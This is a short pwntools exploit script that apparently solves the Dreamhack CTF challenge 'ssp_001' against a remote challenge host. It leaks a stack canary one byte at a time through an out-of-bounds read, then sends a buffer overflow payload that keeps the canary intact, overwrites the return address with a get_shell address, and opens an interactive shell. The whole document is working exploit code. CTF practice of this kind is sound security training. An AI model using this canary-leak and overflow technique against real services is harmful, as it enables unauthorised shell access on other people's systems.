from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./ssp_001")
p = remote("host3.dreamhack.games", 19965)
#gdb.attach(p,api=True)

get_shell = 0x080486b9

p.sendline(b'P')
p.sendline(b"128")
p.recvuntil(b'128 is : ')
i_1 = int(p.recv(2),16)

p.sendline(b'P')
p.sendline(b"129")
p.recvuntil(b'129 is : ')
i_2 = int(p.recv(2),16) << 2*4

p.sendline(b'P')
p.sendline(b"130")
p.recvuntil(b'130 is : ')
i_3 = int(p.recv(2),16) << 4*4

p.sendline(b'P')
p.sendline(b"131")
p.recvuntil(b'131 is : ')
i_4 = int(p.recv(2),16) << 6*4

canary = i_4 + i_3 + i_2 + i_1
print('[+]Canary_leak =',hex(canary))

p.sendline(b'E')
p.sendline(b'150')
payload = b"a"*0x40 + p32(canary) + b"a"*8 + p32(get_shell)
p.sendline(payload)

p.interactive()
